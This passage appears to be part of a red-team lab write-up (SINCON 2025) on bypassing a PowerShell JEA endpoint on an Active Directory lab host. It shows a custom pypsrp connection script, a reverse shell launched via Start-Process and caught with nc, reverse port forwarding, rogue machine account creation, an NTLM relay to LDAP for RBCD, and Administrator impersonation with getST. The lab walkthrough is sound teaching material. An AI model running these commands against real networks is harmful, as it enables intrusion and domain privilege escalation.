+Alias           Add-ProvisionedAppPackage                          3.0        Dism
+...
+</code></pre></div></div>
+
+<h2 id="connecting-to-jea">Connecting to JEA</h2>
+
+<p>Now that you’re familiar with JEA, it should be clear why we are unable to execute commands on the <code class="language-plaintext highlighter-rouge">PORTICUS</code> machine using <code class="language-plaintext highlighter-rouge">nxc</code> and <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+
+<h3 id="understanding-the-errors">Understanding the Errors</h3>
+
+<p>Under the hood, <code class="language-plaintext highlighter-rouge">netexec</code> uses the <code class="language-plaintext highlighter-rouge">Client</code> object from <a href="https://github.com/jborean93/pypsrp">pypsrp</a> to initialize a WinRM connection:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># nxc/protocols/winrm.py#L200
+</span><span class="bp">self</span><span class="p">.</span><span class="n">conn</span> <span class="o">=</span> <span class="n">Client</span><span class="p">(</span>
+    <span class="n">host</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">host</span><span class="p">,</span>
+    <span class="n">port</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">,</span>
+    <span class="n">auth</span><span class="o">=</span><span class="s">"ntlm"</span><span class="p">,</span>
+    <span class="n">username</span><span class="o">=</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">domain</span><span class="si">}</span><span class="se">\\</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+    <span class="n">password</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">password</span><span class="p">,</span>
+    <span class="n">ssl</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">ssl</span><span class="p">,</span>
+    <span class="n">cert_validation</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="bp">self</span><span class="p">.</span><span class="n">check_if_admin</span><span class="p">()</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">domain</span><span class="si">}</span><span class="se">\\</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">process_secret</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">password</span><span class="p">)</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">mark_pwned</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">wsman</code> protocol is initialized, which should have no issues as it has not yet attempted to utilize the <code class="language-plaintext highlighter-rouge">WinRM</code> service. However when the <code class="language-plaintext highlighter-rouge">-x</code> (execute) flag is specified, the <code class="language-plaintext highlighter-rouge">Client-&gt;execute_cmd()</code> or <code class="language-plaintext highlighter-rouge">Client-&gt;execute_ps()</code> methods are called, which will attempt to execute the command on the remote machine.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># nxc/protocols/winrm.py#L231
+# slightly modified for better readability
+</span><span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">payload</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">get_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">shell_type</span><span class="o">=</span><span class="s">"cmd"</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">shell_type</span> <span class="o">==</span> <span class="s">"cmd"</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">execute_cmd</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">codec</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">execute_ps</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Client-&gt;execute_cmd()</code> method uses <code class="language-plaintext highlighter-rouge">winrs</code> to spawn a remote process, and seems to only work with local administrator privileges based on my testing.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># pypsrp/client.py#L174
+</span><span class="k">def</span> <span class="nf">execute_cmd</span><span class="p">(</span>
+        <span class="bp">self</span><span class="p">,</span>
+        <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+        <span class="n">encoding</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s">"437"</span><span class="p">,</span>
+        <span class="n">environment</span><span class="p">:</span> <span class="n">typing</span><span class="p">.</span><span class="n">Optional</span><span class="p">[</span><span class="n">typing</span><span class="p">.</span><span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]]</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span>
+    <span class="p">)</span> <span class="o">-&gt;</span> <span class="n">typing</span><span class="p">.</span><span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">,</span> <span class="nb">int</span><span class="p">]:</span>
+    <span class="p">...</span>
+        <span class="k">with</span> <span class="n">WinRS</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wsman</span><span class="p">,</span> <span class="n">environment</span><span class="o">=</span><span class="n">environment</span><span class="p">)</span> <span class="k">as</span> <span class="n">shell</span><span class="p">:</span>
+            <span class="n">process</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
+            <span class="n">process</span><span class="p">.</span><span class="n">invoke</span><span class="p">()</span>
+            <span class="n">process</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">SignalCode</span><span class="p">.</span><span class="n">CTRL_C</span><span class="p">)</span>
+    <span class="p">...</span>
+</code></pre></div></div>
+
+<p>And, the <code class="language-plaintext highlighter-rouge">Client-&gt;execute_ps()</code> starts a <code class="language-plaintext highlighter-rouge">WinRM</code> session, with the default <code class="language-plaintext highlighter-rouge">microsoft.powershell</code> configuration, if unspecified, and prepends <code class="language-plaintext highlighter-rouge">Invoke-Expression -Command {...}</code> to the command to be executed.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># pypsrp/client.py#L231
+</span><span class="k">def</span> <span class="nf">execute_ps</span><span class="p">(</span>
+    <span class="bp">self</span><span class="p">,</span>
+    <span class="n">script</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
+    <span class="n">configuration_name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="n">DEFAULT_CONFIGURATION_NAME</span><span class="p">,</span>
+    <span class="n">environment</span><span class="p">:</span> <span class="n">typing</span><span class="p">.</span><span class="n">Optional</span><span class="p">[</span><span class="n">typing</span><span class="p">.</span><span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]]</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span>
+<span class="p">)</span> <span class="o">-&gt;</span> <span class="n">typing</span><span class="p">.</span><span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">PSDataStreams</span><span class="p">,</span> <span class="nb">bool</span><span class="p">]:</span>
+    <span class="k">with</span> <span class="n">RunspacePool</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wsman</span><span class="p">,</span> <span class="n">configuration_name</span><span class="o">=</span><span class="n">configuration_name</span><span class="p">)</span> <span class="k">as</span> <span class="n">pool</span><span class="p">:</span>
+        <span class="n">powershell</span> <span class="o">=</span> <span class="n">PowerShell</span><span class="p">(</span><span class="n">pool</span><span class="p">)</span>
+        <span class="p">...</span>
+        <span class="n">powershell</span><span class="p">.</span><span class="n">add_cmdlet</span><span class="p">(</span><span class="s">"Invoke-Expression"</span><span class="p">).</span><span class="n">add_parameter</span><span class="p">(</span><span class="s">"Command"</span><span class="p">,</span> <span class="n">script</span><span class="p">)</span>
+        <span class="n">powershell</span><span class="p">.</span><span class="n">add_cmdlet</span><span class="p">(</span><span class="s">"Out-String"</span><span class="p">).</span><span class="n">add_parameter</span><span class="p">(</span><span class="s">"Stream"</span><span class="p">)</span>
+        <span class="n">powershell</span><span class="p">.</span><span class="n">invoke</span><span class="p">()</span>
+    <span class="k">return</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">powershell</span><span class="p">.</span><span class="n">output</span><span class="p">),</span> <span class="n">powershell</span><span class="p">.</span><span class="n">streams</span><span class="p">,</span> <span class="n">powershell</span><span class="p">.</span><span class="n">had_errors</span>
+</code></pre></div></div>
+
+<p>The issue arises when connecting to endpoints that do not allow the <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> commandlet to be executed, such as the one currently configured on <code class="language-plaintext highlighter-rouge">PORTICUS</code>.</p>
+
+<p>And similarly, <code class="language-plaintext highlighter-rouge">evil-winrm</code> uses the <a href="https://github.com/WinRb/WinRM">winrm</a> ruby gem under the hood to connect and execute commands on the remote machine.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># evil-winrm.rb#L323</span>
+<span class="nb">require</span> <span class="s1">'winrm'</span>
+
+<span class="k">def</span> <span class="nf">connection_initialization</span>
+<span class="o">...</span>
+    <span class="vg">$conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span>
+    <span class="ss">endpoint: </span><span class="s2">"http://</span><span class="si">#{</span><span class="vg">$host</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="vg">$port</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="vg">$url</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span>
+    <span class="ss">user: </span><span class="vg">$user</span><span class="p">,</span>
+    <span class="ss">password: </span><span class="vg">$password</span><span class="p">,</span>
+    <span class="ss">no_ssl_peer_verification: </span><span class="kp">true</span><span class="p">,</span>
+    <span class="ss">user_agent: </span><span class="vg">$user_agent</span>
+    <span class="p">)</span>
+<span class="o">...</span>
+</code></pre></div></div>
+
+<p>And similarly, when the WinRM session is first initialized - <code class="language-plaintext highlighter-rouge">evil-winrm</code> creates the <code class="language-plaintext highlighter-rouge">shell</code> object and calls the <code class="language-plaintext highlighter-rouge">$shell-&gt;run()</code> method.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># evil-winrm.rb#L636</span>
+<span class="k">begin</span>
+    <span class="n">time</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">now</span><span class="p">.</span><span class="nf">to_i</span>
+    <span class="n">print_message</span><span class="p">(</span><span class="s1">'Establishing connection to remote endpoint'</span><span class="p">,</span> <span class="no">TYPE_INFO</span><span class="p">)</span>
+    <span class="vg">$conn</span><span class="p">.</span><span class="nf">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span>
+<span class="o">...</span>
+    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s1">'exit'</span> <span class="k">do</span>
+        <span class="n">pwd</span> <span class="o">=</span> <span class="n">shell</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="s1">'(get-location).path'</span><span class="p">).</span><span class="nf">output</span><span class="p">.</span><span class="nf">strip</span>
+        <span class="k">if</span> <span class="vg">$colors_enabled</span>
+            <span class="n">command</span> <span class="o">=</span> <span class="no">Readline</span><span class="p">.</span><span class="nf">readline</span><span class="p">(</span> <span class="s2">"</span><span class="si">#{</span><span class="n">colorize</span><span class="p">(</span><span class="s1">'*Evil-WinRM*'</span><span class="p">,</span> <span class="s1">'red'</span><span class="p">)</span><span class="si">}#{</span><span class="n">colorize</span><span class="p">(</span><span class="s1">' PS '</span><span class="p">,</span> <span class="s1">'yellow'</span><span class="p">)</span><span class="si">}#{</span><span class="n">pwd</span><span class="si">}</span><span class="s2">&gt; "</span><span class="p">,</span> <span class="kp">true</span><span class="p">)</span>
+        <span class="k">else</span>
+            <span class="n">command</span> <span class="o">=</span> <span class="no">Readline</span><span class="p">.</span><span class="nf">readline</span><span class="p">(</span><span class="s2">"*Evil-WinRM* PS </span><span class="si">#{</span><span class="n">pwd</span><span class="si">}</span><span class="s2">&gt; "</span><span class="p">,</span> <span class="kp">true</span><span class="p">)</span>
+        <span class="k">end</span>
+        <span class="vg">$logger</span><span class="o">&amp;</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="s2">"*Evil-WinRM* PS </span><span class="si">#{</span><span class="n">pwd</span><span class="si">}</span><span class="s2"> &gt; </span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<span class="o">...</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">shell-&gt;run()</code> method will attempt to execute a command, but of course <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> is prepended to the command body, which will fail with the same error as before.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># winrm/lib/winrm/wsmv/create_pipeline.rb#L45</span>
+<span class="o">...</span>
+    <span class="k">def</span> <span class="nf">command_body</span>
+    <span class="p">{</span>
+        <span class="s2">"</span><span class="si">#{</span><span class="no">NS_WIN_SHELL</span><span class="si">}</span><span class="s2">:Command"</span> <span class="o">=&gt;</span> <span class="s1">'Invoke-Expression'</span><span class="p">,</span>
+        <span class="s2">"</span><span class="si">#{</span><span class="no">NS_WIN_SHELL</span><span class="si">}</span><span class="s2">:Arguments"</span> <span class="o">=&gt;</span> <span class="n">arguments</span>
+    <span class="p">}</span>
+    <span class="k">end</span>
+<span class="o">...</span>
+</code></pre></div></div>
+
+<h3 id="using-pypsrp-directly">Using <code class="language-plaintext highlighter-rouge">pypsrp</code> Directly</h3>
+
+<p>Although the <a href="https://github.com/jborean93/pypsrp">pypsrp</a> exposes the <code class="language-plaintext highlighter-rouge">execute_ps()</code> method, you can simply import the underlying classes (<code class="language-plaintext highlighter-rouge">WSMan</code>, <code class="language-plaintext highlighter-rouge">RunspacePool</code> and <code class="language-plaintext highlighter-rouge">PowerShell</code>) to create your own pseudo-shell that doesn’t add any fluff.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pypsrp.wsman</span> <span class="kn">import</span> <span class="n">WSMan</span>
+<span class="kn">from</span> <span class="nn">pypsrp.powershell</span> <span class="kn">import</span> <span class="n">RunspacePool</span><span class="p">,</span> <span class="n">PowerShell</span>
+
+<span class="n">wsman</span> <span class="o">=</span> <span class="n">WSMan</span><span class="p">(</span> 
+    <span class="n">server</span><span class="o">=</span><span class="s">"PORTICUS.jess.kingdom"</span><span class="p">,</span>
+    <span class="n">username</span><span class="o">=</span><span class="s">"Doros_ARCHIVON"</span><span class="p">,</span>
+    <span class="n">password</span><span class="o">=</span><span class="s">"bO3n21E6rc"</span><span class="p">,</span> 
+    <span class="n">ssl</span><span class="o">=</span><span class="bp">False</span>
+<span class="p">)</span>
+
+<span class="k">with</span> <span class="n">RunspacePool</span><span class="p">(</span><span class="n">wsman</span><span class="p">)</span> <span class="k">as</span> <span class="n">pool</span><span class="p">:</span>
+    <span class="n">ps</span> <span class="o">=</span> <span class="n">PowerShell</span><span class="p">(</span><span class="n">pool</span><span class="p">)</span>
+    <span class="n">ps</span><span class="p">.</span><span class="n">add_cmdlet</span><span class="p">(</span><span class="s">"Get-Command"</span><span class="p">)</span>
+    <span class="n">ps</span><span class="p">.</span><span class="n">invoke</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"---"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">output</span> <span class="ow">in</span> <span class="n">ps</span><span class="p">.</span><span class="n">output</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="n">ps</span><span class="p">.</span><span class="n">had_errors</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">ps</span><span class="p">.</span><span class="n">streams</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">error</span><span class="p">)</span>
+    
+    <span class="k">print</span><span class="p">(</span><span class="s">"---"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Running the above script will successfully connect to the <code class="language-plaintext highlighter-rouge">PORTICUS</code> machine and execute the <code class="language-plaintext highlighter-rouge">Get-Command</code> commandlet, returning the available commands in the JEA session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/sincon]
+└─$ proxychains python3 jea.py   
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.3.20.11:5985  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.3.20.11:5985  ...  OK
+---
+Clear-Host
+Exit-PSSession
+Get-Command
+Get-FormatData
+Get-Help
+Measure-Object
+Out-Default
+Select-Object
+Start-Process
+---
+</code></pre></div></div>
+
+<h3 id="publicly-available-tools">Publicly Available Tools</h3>
+
+<p>There are a number of open-source tools that help with connecting to JEA-protected endpoints, such as <a href="https://github.com/sashathomas/evil-jea">evil-jea</a> and <a href="https://github.com/gatariee/minrm">minrm</a>.</p>
+
+<p>This blog post will use <code class="language-plaintext highlighter-rouge">minrm</code> as an example, which is a minimalistic WinRM client that I wrote out of spite after encountering JEA endpoints. The syntax is the same as <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+
+<p><img src="/assets/img/sincon-2/ea4b58399992ea250f2f74574f9cc1d9.png" alt="" /></p>
+
+<h2 id="bypassing-jea">Bypassing JEA</h2>
+
+<p>Now that we have a working JEA session, it’s good to know that <code class="language-plaintext highlighter-rouge">Get-Command</code> is always available, regardless of the session configuration. This allows us to enumerate the available commandlets in the JEA session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[doros_archivon@porticus.jess.kingdom] PS&gt; Get-Command
+Output:
+Clear-Host
+Exit-PSSession
+Get-Command
+Get-FormatData
+Get-Help
+Measure-Object
+Out-Default
+Select-Object
+Start-Process
+</code></pre></div></div>
+
+<h3 id="method-1-reverse-shell">Method 1: Reverse Shell</h3>
+
+<p>The output shows that we have access to <code class="language-plaintext highlighter-rouge">Start-Process</code>, which allows us to start a new process on the remote machine. Using this, we can very simply execute a reverse shell by starting <code class="language-plaintext highlighter-rouge">cmd.exe</code> or <code class="language-plaintext highlighter-rouge">powershell.exe</code>. Note that the <code class="language-plaintext highlighter-rouge">-Wait</code> parameter is required to allow for the connection to be established before the command returns.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[doros_archivon@porticus.jess.kingdom] PS&gt; Start-Process -FilePath "cmd.exe" -ArgumentList "/c powershell -e ..." -Wait
+</code></pre></div></div>
+
+<p>And we can catch the reverse shell on our local machine using <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/sincon]
+└─$ nc -lnvp 445
+listening on [any] 445 ...
+connect to [127.0.1.1] from (UNKNOWN) [127.0.0.1] 35140
+
+PS C:\Windows\system32&gt; whoami
+winrm virtual users\winrm va_33_jess_doros_archivon
+</code></pre></div></div>
+
+<p>We obtain a reverse shell as the temporary virtual account created by JEA, which has local administrator privileges on the <code class="language-plaintext highlighter-rouge">PORTICUS</code> machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-94-0   Mandatory group, Enabled by default, Enabled group
+</code></pre></div></div>
+
+<p>We’ll see that there is an unknown group associated with the <code class="language-plaintext highlighter-rouge">S-1-5-94-0</code> SID, according to <a href="https://superuser.com/questions/248315/list-of-hidden-virtual-windows-user-accounts">this</a> post: the SID belongs to <code class="language-plaintext highlighter-rouge">Windows Remoting Virtual Users</code></p>
+
+<p>It is trivial to escalate privileges from here, however - it is not normal for <code class="language-plaintext highlighter-rouge">Windows Remoting Virtual Users</code> to have an active session for extended periods of time, so this may raise some flags.</p>
+
+<p><img src="/assets/img/sincon-2/0aaedbc52d0dd3dd05415f9744de8420.png" alt="" /></p>
+
+<h3 id="method-2-ntlm-relay-to-ldap-via-http">Method 2: NTLM Relay to LDAP via HTTP</h3>
+
+<p>Alternatively, if you can send requests using protocols that transmit credentials via NTLM (i.e. <code class="language-plaintext highlighter-rouge">SMB</code>, <code class="language-plaintext highlighter-rouge">HTTP</code>), you can relay authentication as the <code class="language-plaintext highlighter-rouge">PORTICUS$</code> machine account, since the JEA session runs with local administrator privileges.</p>
+
+<p>However, relaying <code class="language-plaintext highlighter-rouge">SMB</code> to <code class="language-plaintext highlighter-rouge">LDAP</code> is typically not possible as session signing is enabled on <code class="language-plaintext highlighter-rouge">LDAP</code> by default on all modern Active Directory deployments. Thankfully, as mentioned in <a href="https://blog.async.sg/sincon-2025-adcs-relay.html#esc8-a-tldr">the previous writeup</a>, the HTTP protocol <em>does not</em> support signing, making it possible to relay NTLM authentication to <code class="language-plaintext highlighter-rouge">LDAP</code> via <code class="language-plaintext highlighter-rouge">HTTP</code>.</p>
+
+<p>After relaying to LDAP, there are a number of things that we can do such as <a href="https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/">Configuring RBCD</a> for an attacker-controlled computer account.</p>
+
+<p><img src="/assets/img/sincon-2/ldap_relay.png" alt="" /></p>
+
+<h4 id="reverse-port-forwarding">Reverse Port Forwarding</h4>
+
+<p>Firstly on <code class="language-plaintext highlighter-rouge">TABULARIUM</code>, we can set a reverse port forward to catch the HTTP authentication on Port 8080 (<code class="language-plaintext highlighter-rouge">80</code> is currently being used for IIS):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/27 10:26:06] beacon&gt; rportfwd 8080 0.0.0.0 8080
+[05/27 10:26:06] [+] started reverse port forward on 8080 to 0.0.0.0:8080
+[05/27 10:26:06] [*] Tasked beacon to forward port 8080 to 0.0.0.0:8080
+[05/27 10:26:06] [+] host called home, sent: 10 bytes
+</code></pre></div></div>
+
+<h4 id="creating-a-machine-account">Creating a Machine Account</h4>
+
+<p>We need to have a machine account to set the <code class="language-plaintext highlighter-rouge">msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on, thankfully the domain has a <code class="language-plaintext highlighter-rouge">MachineAccountQuota</code> set to <code class="language-plaintext highlighter-rouge">10</code> (which is the default setting) - this allows us to create up to 10 machine accounts in the domain.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/sincon]
+└─$ nxc ldap PALACE-DC.jess.kingdom -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' -M maq
+LDAP        10.3.20.31      389    PALACE-DC        [*] Windows Server 2022 Build 20348 (name:PALACE-DC) (domain:jess.kingdom)
+LDAP        10.3.20.31      389    PALACE-DC        [+] jess.kingdom\Doros_ARCHIVON:bO3n21E6rc 
+MAQ         10.3.20.31      389    PALACE-DC        [*] Getting the MachineAccountQuota
+MAQ         10.3.20.31      389    PALACE-DC        MachineAccountQuota: 10
+</code></pre></div></div>
+
+<p>We can now create a new machine account <code class="language-plaintext highlighter-rouge">GATARI$</code> with the password <code class="language-plaintext highlighter-rouge">P@ssw0rd</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/sincon]
+└─$ nxc smb PALACE-DC.jess.kingdom -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' -M add-computer -o NAME='GATARI' PASSWORD='P@ssw0rd'  
+SMB         10.3.20.31      445    PALACE-DC        [*] Windows Server 2022 Build 20348 x64 (name:PALACE-DC) (domain:jess.kingdom) (signing:True) (SMBv1:False)                                                                                                                                                         
+SMB         10.3.20.31      445    PALACE-DC        [+] jess.kingdom\Doros_ARCHIVON:bO3n21E6rc 
+ADD-COMP... 10.3.20.31      445    PALACE-DC        Successfully added the machine account: "GATARI$" with Password: "P@ssw0rd"
+</code></pre></div></div>
+
+<p>We can also verify that <code class="language-plaintext highlighter-rouge">GATARI$</code> was created successfully by authenticating against the DC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb PALACE-DC.jess.kingdom -u 'GATARI$' -p 'P@ssw0rd'                                                              
+SMB         10.3.20.31      445    PALACE-DC        [*] Windows Server 2022 Build 20348 x64 (name:PALACE-DC) (domain:jess.kingdom) (signing:True) (SMBv1:False)                                                                                                                                                         
+SMB         10.3.20.31      445    PALACE-DC        [+] jess.kingdom\GATARI$:P@ssw0rd
+</code></pre></div></div>
+
+<h4 id="starting-relay-listener">Starting Relay Listener</h4>
+
+<p>Since HTTP authentication will be coming from <code class="language-plaintext highlighter-rouge">8080</code>, we’ll need to configure <code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code> with the <code class="language-plaintext highlighter-rouge">--http-port</code> set to <code class="language-plaintext highlighter-rouge">8080</code>. Additionally, the <code class="language-plaintext highlighter-rouge">--delegate-access</code> as well as <code class="language-plaintext highlighter-rouge">--escalate-user</code> flags are set to instruct the tool to add delegation rights to the victim machine account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t 'ldaps://PALACE-DC.jess.kingdom' -smb2support --http-port 8080 --delegate-access --escalate-user 'GATARI$'
+</code></pre></div></div>
+
+<h4 id="sending-http-authentication">Sending HTTP Authentication</h4>
+
+<p>We can use the <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code> commandlet with the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5#-usedefaultcredentials">-UseDefaultCredentials</a> flag to send an HTTP request using the credentials of the current user to <code class="language-plaintext highlighter-rouge">PORTICUS:8080</code>, the “current user” in this case is the machine account of <code class="language-plaintext highlighter-rouge">PORTICUS</code>.</p>
+
+<p><img src="/assets/img/sincon-2/65dd71a31699c132b2a090ec41521042.png" alt="" /></p>
+
+<h4 id="receiving-the-relay">Receiving the Relay</h4>
+
+<p>Once the HTTP request is received, <code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code> will relay the authentication to <code class="language-plaintext highlighter-rouge">LDAP@PALACE-DC</code> and modify the <code class="language-plaintext highlighter-rouge">msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of the <code class="language-plaintext highlighter-rouge">PORTICUS</code> computer, to grant <code class="language-plaintext highlighter-rouge">GATARI$</code> RBCD on them.</p>
+
+<p><img src="/assets/img/sincon-2/0eb3ffc2ae53ec10a7a67fe9e208e798.png" alt="" /></p>
+
+<h4 id="resource-based-constrained-delegation">Resource-Based Constrained Delegation</h4>
+
+<p>Now that <code class="language-plaintext highlighter-rouge">GATARI$</code> is able to impersonate all users on <code class="language-plaintext highlighter-rouge">PORTICUS</code>, we can obtain a service ticket to <code class="language-plaintext highlighter-rouge">PORTICUS</code> as the <code class="language-plaintext highlighter-rouge">Administrator</code> user and obtain clean access to the machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -impersonate 'Administrator' -spn 'cifs/PORTICUS.jess.kingdom' 'jess.kingdom'/'GATARI$':'P@ssw0rd'
+Impacket v0.13.0.dev0+20250516.105908.a63c652 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
